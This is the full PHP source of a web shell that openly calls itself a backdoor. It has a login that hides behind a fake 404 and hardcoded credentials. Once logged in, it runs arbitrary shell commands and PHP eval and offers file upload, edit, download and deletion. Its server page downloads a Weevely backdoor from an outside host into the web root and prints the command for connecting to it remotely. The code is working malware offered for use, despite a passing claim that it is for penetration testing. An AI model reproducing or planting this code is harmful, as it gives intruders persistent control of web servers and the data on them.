<?php
/**
* Lite 1.0
*
* [ Lite - Simple shell backdoor ].
* [ Feature : Filemanager,command,upload,php,server info,etc. ] 
*
* @author shutdown57 < alinkokomansuby@gmail.com >
* @version 1.0
* @copyright (c) 2018 Alinko.
* 
**/
@session_start();
@ob_start();
set_time_limit(0);
error_reporting(0);
header("X-XSS-Protection: 0");

/**
*
* /------------------------------------/
* / Lite WebBackdoor configuration     /
* /------------------------------------/
*
* NB : Uncomment this if u lose ur configuration script.
*
* ------- [DEFAULT CONFIG] ------------ / 

$config = array();
$config['username'] 		= "lite"; 
$config['password'] 		= "lite"; 
$config['default_action'] 	= "filemanager";
$config['version'] 			= "1.0-2018";
$config['hidden_login']		= true;	
$config['parameter']		= 'lite_login'; 

* --------[    E O F     ] ------------/
* 
* Accessing this backdoor ::
*
* Link        : http://example.com/lite.php?lite_login
* Username    : lite
* Password    : lite
*
*/

$config = array();
$config['username'] 		= "monkey"; // username
$config['password'] 		= "monkey"; // password
$config['default_action'] 	= "filemanager"; // upload , php , command , server , filemanager.
$config['version'] 			= "1.0-2018"; // version.subversion-revision
$config['hidden_login']		= true;		// if true lite login be hidden and for accessing login page , u must add parameter in last filename like "shell.php?parameter" , for parameter config on the bellow
$config['parameter']		= 'loginkuy'; // parameter for accessing login page if hidden_login true. "shell.php?lite_login" for default parameter.
/**
*
* /-----------------------------------/
* / Lite define path,action,etc.      /
* /-----------------------------------/
*/
define('ROOT',getcwd());
define('CURR_PATH',(empty($_GET['p'])) ? ROOT : $_GET['p']);
define('ACTION',(empty($_GET['a'])) ? $config['default_action'] : $_GET['a']);
define('DS',DIRECTORY_SEPARATOR);

// login form function
function form_login()
{
 echo "<div style='margin-top:50px;'><center><img src='http://coba.kartinisoft.com/src/lite-icon.png'><h3>Lite shell.</h3>";
  echo "<form method='post'><br><input type='text' name='username' placeholder='username' style='width:200px'><br><input type='password' name='password' placeholder='password' style='width:200px'><br><br><input type='submit' value='Login' name='login' style='width:200px'></form></center></div>";
}

// login authetication
if(empty($_SESSION['lite1337']) && !empty($config['username']) && !empty($config['password']))
{
if($config['hidden_login'] === true){
	
	if(isset($_GET[$config['parameter']]))
	{
		form_login();
	}else{
		die(header('HTTP/1.1 404 Not Found'));
	}
}else{
	form_login();
}
  if(isset($_POST['login']))
  {
   if($_POST['username'] == $config['username'] && $_POST['password'] == $config['password'])
   {
   	$_SESSION['lite1337'] = TRUE;
   	echo "<meta http-equiv='refresh' content='0;url=?{$config['username']}-{$config['password']}'>";
   }  
  }
  exit;
}

?>
<!DOCTYPE html>
<html>
<head>
	<title>Lite - <?=$_SERVER['HTTP_HOST'];?></title>
	<meta charset="utf-8">
	<meta name="author" content="shutdown57">
	<meta name="description" content="Lite shell.">
	<link rel="shortcut icon"  href="http://coba.kartinisoft.com/src/lite-icon.png">
	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.1.1/css/all.css" integrity="sha384-O8whS3fhG2OnA5Kas0Y9l3cfpmYjapjI0E4theH4iuMD+pLhbf6JI0jIMfYcK3yZ" crossorigin="anonymous">
	<style type="text/css">
		html,body{background: #333;color: #eee;font-family:arial;}
		nav{background: #eee;color: #333;}
		li{list-style: none;display: inline-block;}
		li a{color: #333;text-decoration: none;font-size:25px;margin:40px;background: #eee}
		li a:hover{color: #888;text-shadow: 0px 3px 0px #000}
		.container{width:70%;margin:0 auto;}
		.table_filemanager{width: 100%;margin-top:5px;text-align: left;border-collapse: collapse;font-size: 15px}
		.table_filemanager tr:nth-child(even){background: #444}.table_filemanager tr:hover,.table_filemanager tr:nth-child(even):hover{background: #666}.table_filemanager th{background: #eee;color: #333}
		a{color: #fff;text-decoration: none;}a:hover{color: #eee;text-decoration: underline;}
		select{background:transparent;border: 1px solid #eee;color: #eee}
		option{background:#333}
		textarea,input{color:#eee;border: 1px solid #eee;background: transparent;}
		textarea{width:100%;height: 300px}input{padding:5px}
		.lite{float: left;border-right:2px solid #333;font-family: courier new;font-weight: bold;text-shadow: 0px 4px 8px #000}
	</style>
	<script type="text/javascript">

		function select_all(pilih)
            {
                var cek = document.getElementsByName('fl[]');
                for (var i =0; n=cek.length;i++) {
                    cek[i].checked = pilih.checked;
                }
            }
            function hs(a,x)
            {
            	document.getElementById(a).style.display='block';
            	document.getElementById(x).style.display='none';
            }
	</script>
</head>
<?php
function lite_curpath($path,$goto){
  $dir = str_replace("\\","/",$path);
   $dir = (is_file($dir)) ? dirname($dir): $dir;
  $dir = explode("/",$dir);
  foreach($dir as $o=>$i){
    if($i == "" && $o == 0){
      echo "<a href=\"?".$goto."=/\">/</a>";continue;}
      if($i == "")continue;
      echo "<a href=\"?".$goto."=";
      for($p=0;$p<=$o;$p++){ 
        echo $dir[$p]; if($p != $o){
          echo "/";} } echo "&a=filemanager\">".$i."</a>/";}
          if(is_writable($path)){echo "- [<b><font color=lime>W</font></b>]";}elseif(is_readable($path)){echo "- [<b><font color=red>R</font></b>]";}else{echo "- [<b><font color=grey>Unknown</font></b>]<meta http-equiv='refresh' content='4;url=?'>";}
          echo "[<a href='?a=logout'><font color=red>Logout</font></a>]";
  }
?>
<body>
<div class="container">
<header>
	<nav>
		<li class="lite"><a href="?p=<?=ROOT;?>">Lite 1.0</a></li>
		<center>
		[ <a href="?p=<?=ROOT;?>&a=filemanager"><font color="black">Home</font></a> ] 
		[ <a href="?p=<?=CURR_PATH;?>&a=upload"><font color="black">Upload</font></a> ] 
		[ <a href="?p=<?=CURR_PATH;?>&a=command"><font color="black">Command</font></a> ] 
		[ <a href="?p=<?=CURR_PATH;?>&a=php"><font color="black">PHP</font></a> ] 
		[ <a href="?p=<?=CURR_PATH;?>&a=server"><font color="black">Server</font></a> ] 
		[ <a href="?p=<?=CURR_PATH;?>&a=lite"><font color="black">About</font></a> ]
	</center>
	</nav><br>
	<div id="cp">
	<a href="#" onclick="hs('goto','cp')"><i class="fa fa-folder-open"></i></a> : <?=lite_curpath(CURR_PATH,'p');?>
</div>
	<form method="get" id="goto" style="display: none;">
		<label><a href="#" onclick="hs('cp','goto')">Go to dir :</a></label>
		<input type="text" name="p" value="<?=CURR_PATH;?>" style="width:300px"><input type="submit" value="GO !">
	</form>
	<br>
</header>
<?php
function lite_filesize($file)
{
	$size = filesize($file)/1024;
 	$size = round($size,3);
 	if($size > 1024){
 		$size = round($size/1024,2). 'MB';
 	} else {
 		$size = $size. 'KB';}
 		return $size;
}
function lite_lastmod($file)
{
	$fdm=@date("d-m-Y H:i:s", filemtime($file));
 	return $fdm;
}
function lite_perms($file)
{
	$perms = fileperms($file);
 	if (($perms & 0xC000) == 0xC000) {
 		$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); 
 		return $info;
}
function lite_action($dir,$action)
{
	$a = "";
	$x = basename($dir);
	if($action == 'dir')
	{	$a.= "[ ";
		$a.= "<a href='?p={$dir}&a=delete' title='delete : {$x}'><i class='fa fa-trash'></i></a> / ";
		$a.= "<a href='?p={$dir}&a=rename' title='rename : {$x}'><i class='fa fa-file-signature'></i></a> ";
		$a.= "]";
	}elseif($action == 'file')
	{	$a.= "[ ";
		$a.= "<a href='?p={$dir}&a=delete' title='delete : {$x}'><i class='fa fa-trash'></i></a> / ";
		$a.= "<a href='?p={$dir}&a=rename' title='rename : {$x}'><i class='fa fa-file-signature'></i></a> / ";
		$a.= "<a href='?p={$dir}&a=edit' title='edit : {$x}'><i class='fa fa-pencil-alt'></i></a> / ";
		$a.= "<a href='?p={$dir}&a=dl' title='download : {$x}'><i class='fa fa-download'></i></a> ]";
	}

	return $a;
}
function lite_action2($dir)
{
	$p = $dir;
	$a = "<br><hr><table><tr><td>";
	$a.= "Filesname </td><td><b> ".basename($dir)."</b>  </td></tr><tr><td>";
	$a.= "Permission </td><td><b> ".lite_perms($dir)."</b>  </td></tr><tr><td>";
	$a.= "File size  </td><td><b> ".lite_filesize($dir)."</b>  </td></tr><tr><td>";
	$a.= "Last modified </td><td><b> ".lite_lastmod($dir)."</b> </td></tr><tr><td> ";
	$a.= "Action  </td><td>"; 
	$a.= "[<a href='?p={$p}&a=rename'>Rename</a>]";
	$a.= "[<a href='?p={$p}&a=delete'>Delete</a>]";
	$a.= "[<a href='?p={$p}&a=edit'>Edit</a>]";
	$a.= "[<a href='?p={$p}&a=dl'>Download</a>]";
	$a.= "</td></tr></table><hr>";
	return $a;
}
function lite_delete($dir)
{
if(is_dir($dir)){
    if(!rmdir($dir)){
      $s=scandir($dir);
      foreach ($s as $ss) {
        if(is_file($dir."/".$ss)){
          if(unlink($dir."/".$ss)){
            $rm=rmdir($dir);
          }
        }
        if(is_dir($dir."/".$ss)){
          $rm=rmdir($dir."/".$ss);
          $rm.=rmdir($dir);
        }
      }
  }elseif(is_file($dir)){
    $rm = unlink($dir);
  }
}elseif(is_file($dir))
{
  $rm = unlink($dir);
}
return $rm;
}

function lite_cmd($cmd)
{
 if(function_exists('system')) {     
    @ob_start();    
    @system($cmd);    
    $c = @ob_get_contents();    
    @ob_end_clean();    
    return $c;  
  } elseif(function_exists('exec')) {     
    @exec($cmd,$results);     
    $c = "";    
    foreach($results as $result) {      
      $c .= $result;    
    } return $c;  
  } elseif(function_exists('passthru')) {     
    @ob_start();    
    @passthru($cmd);    
    $c = @ob_get_contents();    
    @ob_end_clean();    
    return $c;  
  } elseif(function_exists('shell_exec')) {     
    $c = @shell_exec($cmd);     
    return $c;  
  } 
}
function lite_redirect($kemana,$apa = 'html')
{
	if($apa == 'html')
	{
		echo "<meta http-equiv='refresh' content='0;url={$kemana}'>";
	}elseif($apa == 'js')
	{
		echo "<script>window.location.href='{$kemana}';</script>";
	}elseif($apa == 'php')
	{
		@ob_start();
		header('location:'.$kemana);
		flush();
	}
}
function lite_download($file)
{
	@ob_clean();
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
function lite_upload($a,$b){
  if(function_exists('move_uploaded_file')){
    $upl = move_uploaded_file($a,$b);
  }elseif (function_exists('copy')) { 
    $upl = copy($a,$b);
  }
    return $upl; 
  }
function lite_array_upload($file){ 
    $file_ary = array(); 
    $file_count = count($file['name']);
     $file_key = array_keys($file); 
     for($i=0;$i<$file_count;$i++) { 
      foreach($file_key as $val) { 
        $file_ary[$i][$val] = $file[$val][$i]; 
      } 
    } 
    return $file_ary;
  }
function lite_title($text)
{
	echo "<br><hr>";
	echo "<center><h3>..:: $text ::..</h3></center>";
	echo "<hr><br>";
}
function lite_sysfo()
 {
  $mysql = (function_exists('mysql_connect')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $mysqli = (function_exists('mysqli_connect')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $wget = (lite_cmd('wget --help')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $curl = (function_exists('curl_init')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $perl = (lite_cmd('perl --help')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $python = (lite_cmd('python --help')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $bash = (lite_cmd('bash --version')) ? "<font color=lime>YES</font>" : "<font color=red>NO</font>";
  $gcc = (lite_cmd('gcc --help')) ? "<font color=lime>YES</font>" :"<font color=red>NO</font>";
  $sm = (ini_get('safe_mode') == 'on') ? "<font color=lime>YES</font>" : "<font color=red>NO</font>"; 
  $df = (ini_get('disable_functions')) ? wordwrap(ini_get('disable_functions'),100,"\n",true) : "<font color=red>NO !</font>";
  $sysfo = [
    'Hostname' => $_SERVER['HTTP_HOST'],
    'System' => php_uname(),
    'PHP_version' => phpversion(),
    'Software' => $_SERVER['SERVER_SOFTWARE'],
    'IP_Server' => gethostbyname($_SERVER['HTTP_HOST']),
    'IP_Client' => $_SERVER['REMOTE_ADDR'],
    'MySQL' => $mysql,
    'MySQLi' => $mysqli,
    'Wget' => $wget,
    'Curl' => $curl,
    'Perl' => $perl,
    'Python' => $python,
    'Bash' => $bash,
    'gcc' => $gcc,
    'Safe_mode' => $sm,
    'disable_functions' => $df];
    return $sysfo;
 }

if(ACTION == "filemanager")
{
?>
<form method="post">
<table class="table_filemanager" >
	<thead>
		<th><input type="checkbox" name="fl[]" onclick="select_all(this)"></th>
		<th>Files</th>
		<th>Size</th>
		<th>Last modified</th>
		<th>Permission</th>
		<th>Action</th>
	</thead>
	<tbody>
		<tr><td></td><td><a href="?p=<?=dirname(CURR_PATH);?>&a=filemanager"><i class="fa fa-long-arrow-alt-left"></i> Back</a></td><td></td><td></td><td></td><td align="right"><a href="?p=<?=CURR_PATH;?>&a=newfile"><i class="fa fa-plus"></i> file </a>|<a href="?p=<?=CURR_PATH;?>&a=newdir"><i class="fa fa-plus"></i> dir</a></td></tr>
		<?php
		$s = scandir(CURR_PATH);
		@chdir(CURR_PATH);
		foreach($s as $d)
		{if(!is_dir(CURR_PATH.DS.$d)|| $d == '.'  || $d == '..')continue;
		$perm = (is_writable(CURR_PATH.DS.$d)) ? "<font color=lime>".lite_perms(CURR_PATH.DS.$d)."</font>" : "<font color=red>".lite_perms(CURR_PATH.DS.$d)."</font>"; 
			echo "<tr title='Dir : {$d}'>";
			echo "<td><input type='checkbox' name='fl[]' value='".CURR_PATH.DS."{$d}'></td>";
			echo "<td><i class='fa fa-folder'></i> <a href='?p=".CURR_PATH.DS.$d."&a=filemanager'>{$d}</a></td>";
			echo "<td>".lite_filesize(CURR_PATH.DS.$d)."</td>";
			echo "<td>".lite_lastmod(CURR_PATH.DS.$d)."</td>";
			echo "<td>".$perm."</td>";
			echo "<td align='right'>".lite_action(CURR_PATH.DS.$d,'dir')."</td>";
			echo "</tr>";
		}
		foreach($s as $f)
		{if(!is_file(CURR_PATH.DS.$f)|| $f == '.'  || $f == '..')continue;
		$perm = (is_writable(CURR_PATH.DS.$f)) ? "<font color=lime>".lite_perms(CURR_PATH.DS.$f)."</font>" : "<font color=red>".lite_perms(CURR_PATH.DS.$f)."</font>"; 
			echo "<tr title='file : {$f}'>";
			echo "<td><input type='checkbox' name='fl[]' value='".CURR_PATH.DS."{$f}'></td>";
			echo "<td><i class='fa fa-file'></i> <a href='?p=".CURR_PATH.DS.$f."&a=view'>{$f}</a></td>";
			echo "<td>".lite_filesize(CURR_PATH.DS.$f)."</td>";
			echo "<td>".lite_lastmod(CURR_PATH.DS.$f)."</td>";
			echo "<td>".$perm."</td>";
			echo "<td align='right'>".lite_action(CURR_PATH.DS.$f,'file')."</td>";
			echo "</tr>";
		}
		?>
		<tr style="background: #222"><td colspan="2">
			Action :<select name="action">
				<option>----[ action ]----</option>
          <option value="delete">Delete</option>
          <?php
          if(empty($_SESSION['cfile'])){
            ?>
          <option value="copy">Copy</option>
          <?php
            }else{
              ?><option value="paste">Paste</option><?php
            }
            ?>
        </select>  <input type="submit" name="sac" value=">>" style="padding: 1px">
			</select>
		</td><td colspan="4">
			<p style='text-align: right;font-size: 15px;margin: 1px'>copyright &copy; 2018 - Made with &hearts; by <i>shutdown57</i></p>
		</td></tr>
	</tbody>
</table>
</form>
<?php
if(isset($_POST['sac']))
{
	 if($_POST['action'] == 'delete')
    {
      foreach($_POST['fl'] as $dfil)
      {
        @lite_delete($dfil);
      }
      @lite_redirect('?p='.CURR_PATH.'&a=filemanager');
    }elseif($_POST['action'] == 'copy')
    {
      $_SESSION['cfile'] = $_POST['fl'];
      @lite_redirect('?p='.CURR_PATH.'&a=filemanager');
    }elseif($_POST['action'] == 'paste')
    {
      foreach($_SESSION['cfile'] as $paste)
      {
        copy($paste,CURR_PATH.DS.basename($paste));
      }
      unset($_SESSION['cfile']);
      @lite_redirect('?p='.CURR_PATH.'&a=filemanager');
    }

}
}elseif(ACTION == 'view')
{
	echo lite_action2(CURR_PATH);
	echo '<textarea readonly="">'.htmlspecialchars(file_get_contents(CURR_PATH)).'</textarea>';
}elseif(ACTION == 'delete')
{
	@lite_delete(CURR_PATH);
	@lite_redirect('?p='.dirname(CURR_PATH));
}elseif(ACTION == 'rename')
{
	echo lite_action2(CURR_PATH);
	echo "<form method=post>";
	echo "<label>New name : </label>";
	echo "<input type='text' name='newname' placeholder='lite.php' style='width:300px'>";
	echo "<input type='submit' name='s' value='save'>";
	echo "</form>";
	if(isset($_POST['s']))
	{
		$newname = dirname(CURR_PATH).DS.$_POST['newname'];
		@rename(CURR_PATH,$newname);
		@lite_redirect('?p='.dirname(CURR_PATH));
	}

}elseif(ACTION == 'edit')
{
	echo lite_action2(CURR_PATH);
	echo "<form method=post>";
	echo "<textarea name='konten'>".htmlspecialchars(file_get_contents(CURR_PATH))."</textarea><br>";
	echo "<input type='submit' name='s' value='save'  style='width:200px'>";
	echo "</form>";
	if(isset($_POST['s']))
	{
		$konten = $_POST['konten'];
		$fp = fopen(CURR_PATH,'w');
		fwrite($fp,$konten);
		fclose($fp);
		@lite_redirect('?p='.dirname(CURR_PATH));
	}
}elseif(ACTION == 'dl')
{
	echo lite_action2(CURR_PATH);
	@lite_download(CURR_PATH);
}elseif(ACTION == 'upload')
{
	lite_title('Upload file ( multiple )');
	echo "<form method='post' enctype='multipart/form-data'>";
	echo "<label>Upload to : </label><input type='text' name='targetdir' value='".CURR_PATH."' style='width:300px'><br><br>";
	echo "<label>Select file : </label><input type='file' name='flite[]'style='width:300px'  multiple><br>";
	echo "<br><input type='submit' name='upload' value='Upload !' style='width:300px'><br><br>";

	if(isset($_POST['upload']))
	{
		$list_file = lite_array_upload($_FILES['flite']);
		foreach($list_file as $file)
		{	$uf = $_POST['targetdir'].DS.$file['name'];
			if(lite_upload($file['tmp_name'],$uf))
			{
				$msg.= "[<font color=lime>SUCCESS</font>] Uploaded file : $uf <br>";
			}else{
				$msg.= "[<font color=red>FAILED</font>] Upload file : $uf <br>";
			}
		}
		echo $msg;
	}
}elseif(ACTION == 'command')
{
	lite_title('Command');
	echo "<form method=post>";
	echo "<label>lite@console :: </label>";
	echo "<input type='text' name='cmd' style='width:60%;margin:0 auto;'>";
	echo "<input type='submit' value='Execute'>";
	if(isset($_POST['cmd']))
	{
		echo "<br>";
		echo "<hr>";
		echo "<pre>";
		echo lite_cmd($_POST['cmd']);
		echo "</pre>";
		
	}
}elseif(ACTION == 'php')
{
	?>
	<script type="text/javascript">
		window.onload = function()
		{
			document.getElementById('eval').style.display='block';
		}
		function sh(w,u)
		{
			document.getElementById(w).style.display='block';
			document.getElementById(u).style.display='none';
		}
	</script>
	<?php
	lite_title('PHP');
	echo "<center>";
	echo "PHP version : ".phpversion();
	echo "<br>[<a href='#' onclick=\"sh('phpinfo','eval')\">phpinfo</a>][<a href='#' onclick=\"sh('eval','phpinfo')\">eval</a>]</center>";

echo "<div id='phpinfo' style='display:none;'>";
@ob_start();
@eval("phpinfo();");
$pxp = @ob_get_contents();
@ob_end_clean(); 
$awal = strpos($pxp,"<body>")+6;
$akhir = strpos($pxp,"</body>");
echo "<center>".substr($pxp,$awal,$akhir-$awal)."</center>";
echo "</div>";
echo "<div id='eval' style='display:none;'><br>";
echo "<form method=post><textarea name='eval'>echo 'hello';</textarea><br>";
echo "<input type='submit' name='run' value='Run !' style='width:300px'><br>";
echo "</div>";

if(isset($_POST['run']))
{
	$eval = $_POST['eval'];
	echo "<hr>";
	@eval($eval);
}

}elseif(ACTION == 'server')
{
	if(!file_exists(ROOT.DS.'weevely.php')){
	$fp = fopen(ROOT.DS.'weevely.php','w');
	fwrite($fp,@file_get_contents('https://raw.githubusercontent.com/justalinko/justalinko.github.io/master/jshell/Jweevely.php'));
	fclose($fp);
	}
	lite_title('Server');
	echo "<center>[<a href='#' onclick=\"hs('sysfo','weevely')\">Server info</a>] [<a href='#' onclick=\"hs('weevely','sysfo')\">Weevely</a>]</center>";
	echo "<hr>";
	echo "<table width=100% id='sysfo'>";
	foreach(lite_sysfo() as $name=>$val)
	{
		echo "<tr><td>{$name}</td><td>{$val}</td></tr>";
	}
	echo "</table>";

	echo "<div id='weevely' style='display:none'>";
	if(file_exists(ROOT.DS.'weevely.php'))
	{
		echo "<font color=lime> Weevely available.</font> open your terminal and remote weevely :D <br>";
		echo "$ python weevely.py http://".$_SERVER['HTTP_HOST']."/weevely.php jshellv1 <br>";
	}else{
		echo "Weevely not exists";
	}
}elseif(ACTION == 'newfile')
{
	lite_title('New file');
	echo "<form method=post>";
	echo "<textarea name='konten'></textarea><br>";
	echo "<label>Save as :</label><input type='text' name='targetdir' value='".CURR_PATH.DS."newfile.php' style='width:60%'>";
	echo "<input type='submit' name='s' value='save'  style='width:200px'>";
	echo "</form>";
	if(isset($_POST['s']))
	{
		$konten = $_POST['konten'];
		$fp = fopen($_POST['targetdir'],'w');
		fwrite($fp,$konten);
		fclose($fp);
		@lite_redirect('?p='.dirname(CURR_PATH));
	}
}elseif(ACTION == 'newdir')
{
	echo "<form method=post>";
	echo "<label>Make dir : </label>";
	echo "<input type='text' name='dir' placeholder='directory' style='width:300px'>";
	echo "<input type='submit' name='s' value='save'>";
	echo "</form>";
	if(isset($_POST['s']))
	{
		$newname = CURR_PATH.DS.$_POST['dir'];
		@mkdir($newname);
		@lite_redirect('?p='.CURR_PATH);
	}
}elseif(ACTION == 'logout')
{
	session_destroy();
	@lite_redirect('?');
}elseif(ACTION == 'lite')
{
	lite_title("LITE WebBackdoor v1.0");
	echo "<pre>";
	echo "<h3>About</h3>";
	echo "<p>   <b>Lite</b> is a simple and lightweight shell backdoor for excute shell command,filemanager and other.<br>Made with purpose needs penetration testing or filemanager only.</p>";
	echo"<h3>Configuration</h3>";	
	foreach ($config as $name => $value) {
		echo "<font color=green>{$name}</font> ::: <font color=lime>{$value}</font><br>";
	}

	echo "</pre>";
}
?>
</div>
<br><br><br>
</body>
</html>
